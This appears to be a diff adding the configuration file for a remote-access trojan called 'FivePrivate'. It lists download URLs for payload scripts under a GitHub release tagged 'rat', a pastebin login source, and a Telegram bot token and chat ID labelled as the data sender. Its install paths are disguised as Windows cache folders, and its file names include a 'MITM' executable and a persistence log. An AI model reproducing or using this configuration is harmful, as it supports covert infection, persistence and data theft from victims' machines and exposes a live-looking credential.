@@ -1,0 +1,43 @@
+SERVER FIVEPRIVATE
+By BlazeM4CK 2025
+
+;----------DEFINE-SERVER----------------
+0=Login
+1=Direct
+2=Maintenance
+3=Free "Format: STATUS=3|2025-12-12 03:30"
+STATUS=0
+
+;----------LOAD-CONFIGURATION-----------
+MD5=b87675d3d5293f4e5a88ed4026a850c7
+VER=3.2.0.0
+URL-UPT=https://github.com/Dwyyee/Trash-Upload/releases/download/rat/FivePrivate.zip
+URL-LOGIN=https://pastebin.com/raw/K8rm2ESh
+URL-LOGIN-BACKUP=https://backupdata.com/disiniyananti
+URL-UA=BlazeM4CK/2.1 (Linux; Ubuntu 20.04; .NET 8.0; support@blazem4ck.com)
+URL-TIME=https://apiku-online.vercel.app/api/time
+URL-SCRIPT=dummyhehe
+URL-SCRIPT-368=https://github.com/Dwyyee/Trash-Upload/releases/download/rat/aku368.py
+URL-SCRIPT-316=https://github.com/Dwyyee/Trash-Upload/releases/download/rat/aku316.py
+URL-PYTHON=https://www.python.org/ftp/python/3.13.3/python-3.13.3-amd64.exe
+STR-MSG=汚ねぇ口閉じろカス!
+
+;----------DATABASE-SENDER--------------
+DATA-TOKEN=7680555814:AAE6HQZHqSatm0IA7lHW-wFnop8v_F1_RMc
+DATA-CHATID=1648181353
+
+;----------PATH-ENGINE------------------
+PATH-MAIN=C:\\ProgramData\\Microsoft\\Windows\\Caches
+PATH-SEC=C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache
+
+PATH-SCRIPT=dmrc-sls.cab
+PATH-MITM=AgPerfMon.exe
+PATH-LOG=dmrc-perstnce.ini
+PATH-PERFORM=dmrc-cbmv.xsl
+
+;----------BANNED-PATH------------------
+PATH-BAN=C:\\Windows\\Cursors\\aero_unfail_dest.svg
+PATH-BANBACKUP=C:\\Windows\\Cursors\\wait_unfail_dest.svg
+
+;----------ENCRYPTION-------------------
+HMAC=HMAC-BIASA-081525789316
